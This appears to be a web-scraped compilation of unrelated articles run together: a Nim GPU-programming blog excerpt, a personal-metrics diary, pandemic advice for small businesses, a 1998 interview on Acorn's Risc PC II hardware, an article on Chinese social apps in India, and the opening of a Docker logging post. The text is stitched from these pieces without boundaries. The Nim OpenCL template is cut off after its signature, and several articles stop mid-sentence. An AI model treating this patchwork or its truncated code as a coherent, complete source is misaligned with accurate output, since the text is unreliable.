<p>Why? Probably because Nvidia is providing superb tools and documentation for frameworks developers. Also Cuda can leerage a few C++ facilities like generics and function objects that I use heavily for generic code.</p>
<p>For example in Nim+Cuda I define element-wise functions like the following and pass it to a higher-order function that will apply it element-wise on 3 tensors:</p>
<pre>

<span>template</span> <span>cuda_binary_op</span><span>(</span><span>op_name</span><span>,</span> <span>op_symbol</span><span>:</span> <span>string</span><span>)</span><span>=</span>
  <span>{</span><span>.</span><span>emit</span><span>:</span><span>[</span><span>"""
  template&lt;typename T&gt;
  struct """</span><span>,</span><span>op_name</span><span>,</span><span>"""{
  __device__ __forceinline__ void operator()(
      T *  __restrict__ dst,
      const T *  __restrict__ A,
      const T *  __restrict__ B){
      *dst = __ldg(A)"""</span><span>,</span> <span>op_symbol</span><span>,</span> <span>""" __ldg(B);
      }
  };
  """</span><span>]</span><span>.</span><span>}</span></pre><p>You can see here the advantage of C++: <tt><span>typename T</span></tt> to template over int/float/double and higher-order functions/function object for cleaner code. You can also see that Nim can directly inline C++ code with <tt><span>emit</span></tt> and I even templatize the operation_name.</p>
<p>Now what about OpenCL? Unfortunately C doesn’t offer something similar and requires a lot of boilerplate. The alternative, the C++ official OpenCL API and implementation: SYCL is very experimental and I am not sure how it works on actual GPUs.</p>
<p>However thanks to Nim metaprogramming, squashing the C boilerplate is super easy. Here is an example kernel to do C = A op B</p>
<pre><span>template</span> <span>gen_cl_apply3</span><span>*</span><span>(</span><span>kern_name</span><span>,</span> <span>ctype</span><span>,</span> <span>op</span><span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span> <span>=</span>

<p>After using Nim + OpenCL, I actually realized that using C++ function objects was overengineering.</p>
<p>To conclude, at the moment, I am convinced that the best language to work with GPUs is Nim.</p>
<p>Oh, and for those who wants to see real Nim code for neural networks, here is a Fizzbuzz in Nim using neural networks (I didn’t implement it on GPU yet though)</p>

    <h4>TL;DR: By documenting key metrics, I came to better understand the consequences of my actions. I also gained an appreciation for the power of habits and persistence.</h4>
<figure><img src="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics.png" alt="" srcset="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics.png 1200w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-500x500.png 500w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-1024x1024.png 1024w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-150x150.png 150w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-768x768.png 768w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>
<p><em>“Commit to documenting it—no matter what.”</em> That’s the deal I made with myself in late 2018. I agreed that I’d collect the data—be it good or bad. Equally important: I made no commitment to take any other action. I figured that by keeping this simple, I had little excuse to not stick with it. Soon, it also spurred action.</p>
<h2>The tools</h2>
<p>You can collect personal metrics with many tools. The following are the ones I use.</p>
<ul>
<li>Calorie counting on iOS and web app: myfitnesspal </li>
<li>Physical data (heart rate, activity, sleep): Garmin Fenix 5X</li>
<li>Weight, body fat, BMI: Fitbit Aria</li>
<li>Metrics documentation: Numbers spreadsheet </li>
</ul>
<p>These tools aren’t perfect, but they aren’t bad, either. Myfitnesspal contains a lot of inaccurate calorie counts. This requires me to compare items/sources. Wrist-based heart rate tracking also isn’t super-accurate. That said, it’s more convenient than pairing with a chest strap.</p>
<p>Data-syncing can be clumsy. For example, my scale doesn’t talk to Garmin Connect. Still, I want accurate weight data in there for calculating exertion. So, I manually insert my weight into Garmin Connect, each morning.</p>
<p>I also started collecting all my data in Google Sheets. Displaying this data got sluggish, though. This led me to switch to Numbers, which I find snappier.</p>
<p>I also created some workflows in Alfred to speed up the process. Now, I type “gar” into Alfred to rapidly open Garmin Connect for pulling data. I do the same with myfitnesspal, Stripe, and Google Analytics. (I know I could import this data automatically, but have my reasons for not doing so. I’ll get to these in a moment.)</p>
<h2>What I measure</h2>
<p>Since starting I’ve changed which metrics I collect. For the most part, though, they sort into a few key groupings. These are:</p>
<ul>
<li>Activity (daily pushups and situps, stretching, exercise)</li>
<li>Condition (ARHR, sleep, VO2m, weight, trajectory)</li>
<li>Nutrition (meal quality, fasting, calories in/out, deficit)</li>
<li>Personal habits (reading to kids; alcohol intake)</li>
<li>Revenue (passive, billings, 30-day averages)</li>
<li>Startup activity (installs, MRR, outreach, traffic)</li>
</ul>
<p>Each day gets one row, with a column for each of the items noted above. I also keep one cell for notes. Most times this is empty but does come in handy at times. For example, if I’m away from home, I’ll use my most recent 7-day weight average. I then write: “Away; weight estimated” in the Notes cell. </p>
<h2>Observations</h2>
<p>This experience might be the longest personal experiment I’ve ever undertaken. Over the year, I learned a lot from it and collected some notes. The following are ones that stand out. I’ll return to this list and add to it, should other points come to mind.</p>
<h3>One habit leads</h3>
<p>For me, collecting metrics is a keystone habit (Charles Duhigg talks about this in <em>The Power of Habit</em>). So, I document metrics near the beginning of each day. I seldom miss a day. In the odd case that I do, I’m ill-at-ease until I’ve filled in those cells.</p>
<p>This is telling. Metrics are in part about establishing positive habits and removing negative ones. For me, this makes measuring my habits my most important habit—and I stick to it.</p>
<h3>Manual matters</h3>
<p>My first successful metrics experience related to finances. Ours weren’t where they should be, so I set aside a weekend (~4 years ago) to create a better system. I collected every expense from the previous 6 months, sorted them into groups, and averaged them. This allowed me to see our monthly expenditures. It also helped me predict costs for upcoming months.</p>
<p>This resulted in a finances spreadsheet. Every day, I manually document our bank and credit card transactions in it. Every month, I copy-and-paste the monthly template for the next month. This process allows me to track our accounts for anomalies. It helps me spot potential shortfalls. It also indicates when I can set aside surplus funds for savings.</p>
<p>Could I automate most of this with personal finance software? Yes. But, it’d distance me from the process. That extra step of documenting expenses manually only adds a few minutes to my day. In exchange for that time I gain a sense of control that I value. </p>
<p>This approach also allows for customization. For example, I fill cells with positive actions (going for a run) or key milestones (a new MRR record) in green. This sounds trivial, but it’s not. These act like gold stars and provide tiny dopamine hits that affect my behavior.</p>

<h3>I can predict the future</h3>
<p>Much like I can predict our finances by documenting patterns, I can do so with personal matters. I once wrote that you <a href="http://www.erickarjaluoto.com/blog/why-you-shouldnt-step-on-the-scale/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">shouldn’t step on the scale</a>. I was wrong. A better position would have been: Don’t let today’s measurement derail your progress.</p>
<p>My weight fluctuates up to five pounds over 24 hours. This is in part because I practice alternate-day <a href="http://www.erickarjaluoto.com/blog/i-lost-one-pound-for-every-year-of-my-life/" target="_blank" rel="noreferrer noopener" aria-label="fasting (opens in a new tab)">fasting</a>. (I recognize that fasting seems extreme to some, but I find it manageable and productive.) Daily scale readings aren’t that informative. So, I tally the last week’s readings and divide the sum by 7. Doing so gives me my 7-day average. From this I see a pattern.</p>
<p>So long as I practice the same behaviors, my weight tends to follow a clear trajectory. This also allows me to calculate daily average weight loss. From this, I can extrapolate my approximate weight a week, month, or 6 months down the road. This isn’t an exact science, but it is quite useful.</p>
<h3>Data doesn’t lie (sort of)</h3>
<p>Last fall my weight loss hit a standstill. This frustrated me. Around the same time, a friend noted that weight loss involves plateaus. (I also found mention of this on Reddit.) So, I shrugged my shoulders and thought to myself, “I’ve plateaued. I guess this is as far as I go.”</p>
<p>A few weeks later, though, I took a closer look at my metrics. It turned out that I had gotten a little lax about food intake. In fact, I was up by around 500 calories a day. This wasn’t enough for me to put on weight—but it also wasn’t enough for me to drop weight.</p>
<p>I don’t want you to think that I’m obsessed with weight loss. Yet, it’s a useful way to examine how habits and tracking work—because it allows me to measure outcomes so easily.</p>
<p>We often make up reasons for why something doesn’t work. Data helps me overcome these preconceptions. It also sets me up to better assess what’s actually happening.</p>
<h3>Measurement spurs action</h3>
<p>I make a point of implementing a couple of small rituals aimed at creating more time with my kids. One is a nightly bedtime story. The problem is that by 9:00 PM, I’m beat. This leads me to put off reading, reasoning that we can do it the next night. The next night is often the same.</p>
<p>I know the boys are getting old for bedtime stories. I’m glad they take part in them now but recognize they won’t for much longer. So, I track each night I read to them. Doing so is a small act, but it serves as a daily reminder about whether I’m making time for something that matters. The longer I track such things, the more I tend to see my behavior shift. </p>
<h3>Streaks have limits</h3>
<p>A lot of folks believe in the power of streaks. This practice involves setting a habit and tracking its completion each day. Most times folks use a streaks tool or calendar to do this. The plan is to create a habit by not breaking the streak. I like this idea but it doesn’t work for me.</p>
<p>My problem with streaks is that breaking one is demoralizing. It is so much so that it stops me from starting another. I felt this most after 104 days of abstaining from alcohol. We were at a fundraiser, and I thought ”I’ve been good. Why not treat myself to a glass of wine?” The next day, I had to start my count again from 1. Bummer! Actually, more than that—I felt like I had thrown away all that discipline.</p>
<p>So, I adapted streaks to work better for me. Now, I track every day I don’t drink over the year. This means that if I slip one day, it’s OK. I haven’t lost my count for the year. I enjoy the break and start again the next day. This reduces the sense of failure and lowers the emotional cost of restarting.</p>
<h3>Exercise works faster than I expected</h3>
<p>I always figured that you needed to do a lot of exercise before you saw results. To my surprise, I found the opposite this year. For example, a week of short runs every morning can drop my average resting heart rate (ARHR) by 10 beats a minute. On a bit longer of a timeline, I saw my VO2 max increase by 15% over six months with moderate activity.</p>
<p>These aren’t super-impressive numbers. Yet, they make me optimistic about how much I could achieve if I applied myself. I’m also quite excited by the gains I saw by adding a small amount of interval training. This seemed to pay off within only days.</p>

<h3>Metrics evolve</h3>
<p>I started out thinking that my metrics collection method needed to be perfect. In fact, this idea got in the way of me starting. Turns out it’s not the case. The act of collecting metrics is the important part. Once you start you can retool as you see what works or doesn’t.</p>
<p>For example, I tracked daily steps for a long time. I didn’t find this information that useful (because it doesn’t accommodate my cycling or skiing.) I also tried to make a habit of cold showers and drinking matcha tea. Neither of these stuck either—so, I removed them.</p>
<p>I figure it’s reasonable for a document like this to evolve. I do version the file when I make significant changes, though. This allows me to roll it back if I change my mind.</p>
<h3>Persistent action delivers</h3>
<p>Collecting metrics taught me that small matters add up to significant outcomes. These are for both the better and for the worse. You don’t put on weight through one night of binging. You do so with just one beer a night.</p>
<p>Think of this way: On a sedentary day, I burn ~2,200 calories. That’s not a lot. If I manage to stay under that number and add one beer a day, I’ll quickly find the number on my scale moving upward. But, removing 200 calories from my allotment of 2,200 has the opposite …</p></div></div></div></div>

    <h4>TL;DR: Coronavirus presents a threat to many. Some businesses won’t survive it. Yours might if you act decisively, cut costs, and commit to working as hard—and consistently—as ever.</h4>
<figure><img src="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/paddling-2.png" alt="" srcset="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/paddling-2.png 1200w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/paddling-2-500x500.png 500w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/paddling-2-1024x1024.png 1024w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/paddling-2-150x150.png 150w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/paddling-2-768x768.png 768w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>
<p><em>I don’t need to tell you that we’re in a bad spot.</em> You know that Coronavirus presents an existential risk for many. You’re also well aware of the potential economic fallout from all this.</p>
<p>I can’t do much to change that on a larger level—aside from keeping my family holed up (like you probably are). But, I can share my take on this situation, from a business owner’s perspective.</p>
<h2>Bad times are inevitable</h2>
<p>In 2008, Shelkie and I were in a bad way. We over-invested in a startup that didn’t pan out, after foolishly turning away paying client work. When the bottom fell out of the economy, we were screwed. At the worst point, we had only 2 weeks of cash remaining</p>
<p>It was grim at times, but we didn’t have many options. So, we reduced our costs. We cut our office space to one-third. We eliminated any non-essential expenses. We stopped taking paychecks. We didn’t sugar-coat anything. We were out of hail Mary’s and didn’t expect a quick resolve. We were determined to survive. (We joked that we were cockroaches.)</p>
<p>The rest of the time? We worked—like we always had. We kept servicing the few clients who were still buying. We explored new product ideas. We penned blog articles and wrote a book. We kept pushing.</p>
<p>The toughest days were in early 2009. It was winter, so, it was dark when we arrived at the office each morning—and when we left for the day. When I think back, all I remember is our overstuffed closet-like workspace, the darkness outside, and a sense of everything having ground to a halt.</p>
<h2>This too will pass</h2>
<p>That was a tough stretch, but it wasn’t the first we’d live through. It won’t be the last, either (especially as evidenced over the past week). That said, for as challenging—and dreary—as that time was, we made it through. With time the bank balance grew. Calls started coming in again. New opportunities arose.</p>
<p>This time will be no different. I realize that some (individuals and businesses) won’t survive it. That said, a great many will. From a probability standpoint, you’re more likely to make it than not. What you do today will play a part in that.</p>
<p>This next part will sound opportunistic, but that makes it no less true: Some will prosper as a result of this pandemic. I don’t mean to suggest that they’ll do anything dubious or unethical. I simply recognize that some will act with the long-term in mind.</p>
<p>Some will reflect on our situation, see how business is changing, and build tools to capitalize on these changes. Others will develop new product lines while their friends are binging on Netflix. A few will watch the market. They’ll double-down on stocks when they hit record lows, and then watch their money multiply. </p>
<h2>What you’ll do next</h2>
<p>I don’t know how this situation will turn out. What I do know is that uncertain situations often require you to keep acting as you were—even if doing so feels abnormal. Have you ever canoed into big waves? If so, you know that stopping is not the answer (unless you want to flip the canoe). If you want to stay afloat, you keep paddling, just like you did before.</p>
<p>If you run a small business, you must act prudently. That might mean cutting any costs that don’t generate revenue. Beyond that, though, I’d ask you to act with the same clear-headedness that you did before this crisis. Don’t panic. Don’t go into the fetal position. Don’t do anything rash. Pause for a moment, take a breath, and assess the situation.</p>
<p>What must be done today? Get to that first. Then look at what you can do to spur new business. Perhaps it’s a call to existing customers to offer payment relief. Maybe it’s a special offer or some kind of added value to those who’re struggling. You might even ask if there’s a better way to service your customers. (Craft breweries in Vancouver are offering home deliveries—to keep their beer flowing.)</p>
<p>You have some time on your hands. Turn this to your advantage. Tidy your workspace. Work through your task backlog. Revamp your server architecture so it’s up-to-date and efficient. Prototype new products and announce them.</p>
<p>Even more important: Treat people well—be they your staff, customers, or partners. Today is a test of your character. You and your brand will be measured by the way you respond to this threat—and how you take care of your people.</p>
<h2>Homework</h2>
<p>Take 5 minutes to create a daily routine for yourself. It should include time for uninterrupted work, sales/networking, exercise, and rest. Chunk it out in big blocks (hours) and keep it simple. Tomorrow morning, you’ll get up early, and follow this schedule like your life depends on it. You’ll do the same the day after, and the day after that—until doing so feels normal. You’ve got this.</p>

<p><cite>Richard Hallas interviews Dave Walker</cite></p>

<p>In early 1998 Richard Hallas, then editor of RISC User interviewed Acorn's Dave Walker about the future of Acorn and Acorn machines. A cut down version of this review was published in RISC User volume 11 issue 4. This is the full text of the original interview. Just a few short months after this interview Acorn collapsed. This article provides a fascinating insight into what could have been, as Dave Walker himself admitted, a year is a long time in computing...</p>

<h4><span color="#0000DD">Acorn's Future Technologies<br></span></h4>

<p><i>Risc PC II and the future of desktop machines The specifications of the Risc PC II have changed quite a lot since it was first announced. For the sake of accuracy, would you please give a brief summary of what its most important features are? Also, how much faster in real terms will it be than the current StrongARM Risc PC?</i></p>

<p>Well, it's still to be determined precisely which components are going into the system; everything hinges on the support which can be squeezed into IOMD2 before we freeze the design. The processor you get at the moment is a StrongARM 110 Revision T, which is slightly different in the memory management area to what's in the Risc PC: DEC have done a few modifications, but it's still clocked at 233MHz. If you were to put a Revision T in a Risc PC, you wouldn't be able to tell the difference between it and what we're currently shipping, which is a Revision S.</p>

<p>The video system has had a major overhaul; a new iteration of VIDC20, designated VIDC20R, is to be used as standard. VIDC20R is essentially the VIDC2L cell as used in the ARM7500 and 7500FE, with the components which were originally removed from the 2 cell to make the 2L cell added back in. The reason for taking this route is that VIDC20 was fabricated with a feature size of about 1.0 to 1.1 micron, whereas VIDC2L was relaid to make it fabricatable on a 0.6 micron process. This feature shrink results in a significant pixel clock speed increase; in fact, it's a doubling to 200MHz from the original 100MHz. When coupled with 4Mb of fast VRAM soldered to the motherboard, this will give you 1600x1200x32K colours at 75Hz; we've actually tried this on a test harness we built when we received the first VIDC20R samples, and we had to borrow the monitor from our top-end CAD workstation to track the results as it was the only monitor in the building which would keep up!</p>

<p>The audio system has also had a significant rework. VIDC won't be providing the bulk of sound output; instead there is a new codec chip going on the motherboard which emulates a SoundBlaster card. I don't believe it supports wavetable synthesis, but it does have a microphone feed (which you'll find on the front panel, along with the headphone jack, power switch and reset button). Also connected with the codec chip is a couple of sockets on the back panel; you'll find a PC-style game port which will double as a MIDI port (in and out, not thru); as part of the main I/O system you'll also find two serial port sockets, each of which should be able to move data at least as quickly as the serial port on the current Risc PC. You'll also find a parallel port, as per current Risc PC, and PS/2 mouse and joystick ports; it's expected that the current Risc PC will be the last Acorn machine to support the quadrature mouse interface.</p>

<p>Finishing off the I/O side, there are three slots on a backplane to take existing podule-style expansion cards, and four PCI slots. The Risc PC/A7000(+)-style NIC slot has been done away with. There will be a single 1600K floppy drive fitted, it's looking like all machines will ship with a 24x-speed CD-ROM drive as standard, and hard drives are catered for with EIDE Mode 4 support which will handle two master-slave device pairs.</p>

<p>Other than the video performance, the biggest difference the user will spot in use is the machine's speed; raising a wet finger in the air, I'd reckon that, using a 233MHz StrongARM, Phoebe will be somewhere between 2.5 and 3.5 times faster than a current 233MHz StrongARM Risc PC.</p>

<p>On a standard Risc PC, the address and data buses are clocked at 16MHz; on the new machine, you're looking at a bus speed of 66MHz. There are two reasons why it's 66MHz: the first is that things get ugly at speeds above that; you get signals jumping off PCB tracks at corners (no kidding!) and you have problems with sockets involving massively increased radio frequency (RF) emission and the fast transients reflecting from the physical track-to-pin interface back down the track. The second reason is that 66MHz is the fastest external clock speed which StrongARM can synchronise to; hence there is little point in producing a PCB which is clocked at a higher rate.</p>

<p>To keep up with this bus speed, RAM is moving from being 70ns refresh on 72-pin SIMMs to significantly quicker SDRAM on DIMMs; the box will ship with a single 16Mb DIMM as standard, and a second DIMM socket left vacant.</p>

<p><i>The StrongARM Risc PC is still a powerful machine, and the need for a replacement for it is much less urgent than it was when the Risc PC replaced the A5000. If the StrongARM Risc PC is adequate for most users' needs, then who is going to buy the expensive new machine?</i></p>

<p>People who need Even More Power(TM). For example, StrongARM Risc PCs still only have the same screen rendering capability as ARM610 Risc PCs, and owing to the speed constraints of the podule bus which any network card is currently hung off, don't make particularly wonderful network servers. VIDC20R sorts out the first problem, PCI support fixes the second, and the accelerated main bus, SRAM and SDRAM makes everything happen significantly quicker. If the current StrongARM Risc PC can be likened to an Archimedes 440/1, Risc PC II is the spiritual successor to the 540 (and then some).</p>

<p><i>What will happen to the existing Risc PC? Will it continue to be made, and for how long?</i></p>

<p>We're expecting to continue to produce the StrongARM Risc PC, in J233 hardware spec, at least, for the foreseeable future. It'll still be more than adequate for a large number of users.</p>

<p><i>Many users have expressed disappointment that the Risc PC's modular case design has been dropped. Why have you taken this decision?</i></p>

<p>Two reasons. First of all, once you push the speed of a board up, it starts radiating more and more radio frequency interference. If you were to take the existing Risc PC case, which is made of plastic, with a metal-spray layer to cut RF from its board down to acceptable levels, and try to shoehorn the Risc PC II board into it, not only would you have enough RF coming out of the case to violate both CE and FCC regulations, but the picture on your monitor wouldn't be exactly free from interference!</p>

<p>Second, producing a case design from scratch and running a smallish-volume production line to make them costs an absolute fortune, and that's not taking into account the overheads of the safety compliance testing. It's far more cost-effective to take an existing case which is large and well-shielded enough for our needs, and then make whatever cosmetic and minor functional changes to it we need to. We're taking an NLX tower case, having an extra cut-out tooled into the back panel to accommodate the three podules, and replacing the remarkably dull and boring standard plastic fascia with something a little more distinctive!</p>

<p><i>What's your position regarding compatibility with other platforms, particularly DOS/Windows and Unix? Does Acorn have any plans to provide support for the use of other operating systems on the new machine itself?</i></p>

<p>Unix is something very close to my heart, and I'm certainly going to do my utmost to enable Causality (RiscBSD) and Russell King (ARM Linux) to have access to docs and prototype hardware at the same time as other registered developers. While Galileo is closing out development, Unix is likely to be the only way to get multiple ARMs doing symmetric multiprocessing in one of these machines, and I'm up for extended testing if they're up for writing the code. Put it this way: I don't expect the Risc PC II I'll be buying for home use to be spending most of its time running RISC OS!</p>

<p>As far as DOS/Windows compatibility is concerned, this is of vastly less importance to me personally since I don't use either; however, it seems to be something which a lot of users want. The idea for supporting this is to interface to PCI-based PC cards, which are already available; you'll find ads in the back of Byte which advertise cards comprising an IAPX86 CPU (everything from a P90 upwards), local DRAM, a bus-mastering PCI controller and often a 2D graphics controller. Video output from the RISC OS side of the system would be looped through such a card to a monitor; you'd probably lose the capacity to have both displays on screen simultaneously without some cunning scaling and blitting, but we tend to find that users tend to use their systems wholly within one environment of the other anyway.</p>

<p>We don't have any plans ourselves to support other operating systems; however, that's never stopped developers in the past!</p>

<h4><span color="#0000DD">RISC OS and Galileo<br></span></h4>

<p><i>What significant improvements will be apparent in the next version of RISC OS, and how will it take advantage of the improvements in the Risc PC II?</i></p>

<p>The first improvement you're going to see isn't necessarily an improvement; it's a requirement, which is that it runs on the new hardware, and is also capable of doing things like addressing the PCI bus that we're going to get on the Risc PC II. As far as actual improvements are concerned, Mike Stephens, who's Mr Kernel-God, has made some interesting enhancements when it comes to memory management (he's actually implemented a few new algorithms that he's come up with), so this means the kernel's going to run quicker. Also, as far as filing systems are concerned, there's a few limitations that the existing Filecore has which have got on quite a few people's nerves for the last ten …</p></div></div>

    <div><p>Spend $2,000, earn $50,000! This is not the tagline of a ponzi scam. Not even close. Those four words summarise the testimony of a Twitter user who appears to be running a business on Shopify. He began sending free products to anyone who had more than 5,000 followers on TikTok about three months ago, with no compulsion for product reviews.&nbsp;</p>

<p>On Thursday, one of those TikTok users made a review video that got over two million views. A day later, the business clocked in sales worth $50,000. The whole exercise cost the business owner only about $2,000.&nbsp;&nbsp;&nbsp;&nbsp;</p>

<p>While the Twitter user shared the incident as a marketing pro-tip, the amazing influential power that TikTok and similar social media apps wield is quite thought-provoking.&nbsp;</p>

<p>A decade ago, it was close to unthinkable for Indians to find an alternative to Facebook. A ‘Made in India’ or ‘Made in China’ social media app was not even considered a viable business idea to begin with, given the monopoly of Western giants such as Facebook, Google and Twitter.&nbsp;</p>

<p>Fast forward to 2020: A multitude of social media apps from China such as TikTok, Helo, Vigo and Kwai have conquered the vernacular space, becoming giant-killers in the process.&nbsp;</p>

<p>According to a detailed analysis by MacroPolo, the in-house think tank of the Paulson Institute, Chinese apps have taken the lead in India—the largest emerging market—in under five years. In 2015, Chinese apps accounted for only 23.9 per cent of the total apps downloaded in India, while the US share, led by Facebook, WhatsApp and Facebook Messenger, accounted for 61.6 per cent in the top 10 non-gaming downloads category.&nbsp;</p>

<p>However, by 2019, there was a complete role reversal with the Chinese apps dominating 60.5 per cent of the downloads while the US share plummeted to 31 per cent. Meanwhile, the Indian app share fell from 14.3 per cent in 2015 to 8.4 per cent in 2019, despite millions of users making their debut on the internet.&nbsp;</p>

<p>In 2015, WhatsApp, (Facebook) Messenger and Facebook—all three from the US—were the top three non-gaming apps the Indians downloaded. However, by 2019, the TikTok (including Musical.ly) and Likee (formerly LIKE Video)—both Chinese apps—replaced Facebook and its messenger app among the top three. WhatsApp, which was the table topper in 2015, was pushed to the second position by TikTok.&nbsp;</p>

<p>A key takeaway from the Macropolo analysis was that while the US domination is heavily reliant on one company—Facebook, the Chinese, on the other hand, is less dependent on a single company. While TikTok's owner Bytedance was responsible for around 40 per cent of the Chinese market share, Alibaba’s two apps—UC Browser and Vmate—also command significant market share.&nbsp;</p>

<p>How did the popular Chinese apps outrun Facebook in India? By capturing the vernacular language market.&nbsp;</p>

<p>To understand the growth of these Chinese apps in India, one must look across the border to China. The Chinese Communist Party ensured that there was no space for the likes of Google and other Western technology companies on their land. Yet, the Chinese proved more technologically advanced than even the US—their social media game began back in the 1990s. According to a McKinsey report, Chinese users were able to embed multimedia content in social media more than 18 months before Twitter users could do so in the United States.&nbsp;</p>


<p><b>Invasion from the north&nbsp;</b></p>

<p>In the early 2010s, the Chinese social media landscape was more or less saturated with the likes of Sina Weibo, Renren and Kaixin001. Having conquered the largest population of internet users, the Chinese then turned to the second-largest market—India.&nbsp;</p>

<p>Facebook, Reddit, WhatsApp, Twitter—the social media needs of Indian users were mostly confined to these around 2014. Users were predominantly from metros. English content attracted the first 200 million people online in India. However, internet users in the country-side were growing at a much faster pace, beyond the borders of the cities to towns and villages.&nbsp;</p>

<p>The next million dollar opportunity, however, came with a linguistic challenge. From English speaking users the target now shifted base to non-English speaking, first-time internet users. As a result, by 2015 there were a host of startups in the country who were focused on developing technologies to create content in India's vernacular languages.</p>

<p>Among the tech giants who identified the vernacular, voice and video trends, it was the Chinese who grabbed the opportunity and surprised the world with their short-format video mobile apps. Having closely witnessed the growth of a similar content market in Mandarin, the Chinese players gatecrashed India with apps that offered entertainment, user-generated videos and news for a heterogeneous audience that preferred to consume quality content in their native language.&nbsp;</p>

<p>Soon, TikTok, a video-sharing social networking service owned by ByteDance, emerged as a trendsetter. “TikTok used a challenger strategy and it focused where the leaders didn’t. TikTok reached out to the masses and strategically focused on tier 2 -3 towns. And in fact, the users of TikTok are more skewed towards low-earning individuals.&nbsp; Compared to Vine (another video hosting platform), TikTok gave people a platform where there was less effort required to express and share the content. It cracked the perfect formula of video and vernacular content,” says Anjali Malthankar, National Strategy Director, Tonic Worldwide, an independent digital marketing agency.&nbsp;</p>

<p>The Chinese players’&nbsp; biggest success is that they have given equal weight to their content strategy as to their product and tech strategy. “They created internal teams for content curation for each vernacular language and built a mature ecosystem of micro content-creators across villages and small towns, who churned out short-format videos that appealed to the sensibilities of Bharat,” notes Vikrant Khanna, co-founder of Mogi App, a video delivery SaaS platform.</p>

<p>The Chinese apps also tasted success in India as they figured out the significance of cross-platform content proliferation. This has reflected in their content strategy on Helo. For instance, "Good Morning" and "Chai Pi Lo" posts became huge hits on WhatsApp.</p>


<p><b>Local players</b></p>

<p>According to a report by KPMG, Indian language internet users are expected to grow to 536 million by 2021 from 234 million in 2016. Nine of 10 internet users in India are likely to be Indian language users. Such is the potential of the market in the country.&nbsp;</p>


<p>Despite Chinese dominance, Indian players have neither quit nor surrendered. Desi apps like ShareChat and DailyHunt have recorded steady growth. According to a <i>Business Standard</i> report, the two apps were “toggling between 25-30 million active monthly users” as of 2019-end.&nbsp;</p>


<p><b>Content regulation and moderation</b></p>

<p>Like most matters in the digital space, the proliferation of vernacular social media comes with its own challenges and dangers. While banning the 59 apps with Chinese links, the Ministry of Electronics &amp; Information Technology stated that the apps were allegedly engaged in "activities which are prejudicial to sovereignty and integrity of India, defence of India, security of state and public order.”&nbsp;</p>

<p>It is no secret that these companies capture huge troves of data to produce content that generates traction and popularity. However, there is little regulation or safeguard for such data.&nbsp;</p>

<p>The foremost of all issues is how these apps handle personal data, especially when it comes to children. Last year, TikTok faced investigation in the UK for allegedly violating the general data protection regulation (GDPR) which “requires the company to provide different services and different protections for children,” reported <i>The Guardian</i>.&nbsp;&nbsp;</p>

<p>On a number of occasions, at least a few of the vernacular content apps in India were also accused of promoting ultra content, especially child pornography in India.&nbsp;&nbsp;</p>

<p>The lack of data protection has wider security implications, too. According to a report by <i>The New York Times</i>, the US government has initiated a national security review of TikTok because it suspects that the app was sending user information and other data to China.&nbsp;</p>

<p>Such matters are a nightmare in India because the country is yet to have a data protection law.&nbsp;</p>

<p>At the same time, laws are effective only in a society where there are informed users. So, the primary need is for proactive education and timely reminders to users about the responsibility they hold in making their social network safe for all.&nbsp;</p>

<p>As blogger Bharath Shanker notes in a <i>Medium</i> post, prevention is better than cure. “Every new user who signs up must be made aware of what is acceptable and not acceptable on the platform and educated about the availability of options to report and block. This education is extremely crucial to new vernacular language users who might be more vulnerable to platform abuse than the first set of users on Facebook/Twitter/Instagram.”&nbsp;</p>

<p>Organisations should do well to take cognisance of this and work on strengthening data privacy by putting on an end-user lens rather than a regulatory lens.&nbsp;</p>

<p>Now, with the apps facing ban in India, many content creators are migrating to YouTube and Instagram. But will Alphabet and Facebook gain from China’s loss? It is still too early to say.&nbsp;&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Whatever programming language you use, sooner or later you will want to find out what happens in your program at runtime. The objectives of obtaining such information may differ from developer to developer and from user to user, but whatever the objective one thing remains consistent - you will need the logs of your program to achieve it. Like many before us, we experienced this need.</p><p>Considering the fact that all of our almost-monolithic applications run inside docker containers, at first, work was organized to collect logs from these containers.</p><p>A critical requirement for collecting logs was the need for <strong>an aggregate</strong> search when responding to incidents - ddos ​​attacks, abnormal user behavior, error spikes given to mobile applications, and research on penetration attempts. What free solution can beautifully display our logs at consecutive intervals? We settled on ElasticSearch along with Kibana, which provides out-of-the-box fast aggregate searches within consecutive time intervals.</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/aggregation-2.png" alt=""></figure><p>When inserting non-single records in ElasticSearch, ElasticSearch insists on inserting data with a large set of records (batches) in the format that ElasticSearch defines.</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Arc0-1.svg" alt=""></figure><p>As you can see in the picture above, we know the sending point and the destination point of our structured messages (logs). And we want to minimize the number of programs that will convert message formats - from docker-container to the message set format that ElasticSearch requires.</p><p>Elasticsearch for such cases has a special solution - Logstash, thus forming the famous ELK abbreviation (Elasticsearch, Logstash, Kibana).</p><p>Among the possible solutions for integrating Logstash together with docker <a href="https://docs.docker.com/config/containers/logging/gelf/">in the documentation</a> we can find the GELF (graylog extended format logging) message format. Let's look at the final log transfer stream.</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Arc1.0-1.svg" alt=""><figcaption>initial application logs dataflow</figcaption></figure><p>Inside the docker containers there is a web application written in ruby ​​(best language in the world, btw) that processes each request in a separate thread. To prevent slow clients from slowing down application threads, we, like many, use nginx. Therefore, we would also like to receive request logs from nginx.</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Arc1.1-1.svg" alt=""><figcaption>application logs dataflow</figcaption></figure><p>This stack is relatively quick to configure, without blocking the continuous improvements that are still required.</p><hr><h2 id="logging-2-0">Logging 2.0</h2><p>There were several issues with configured logging 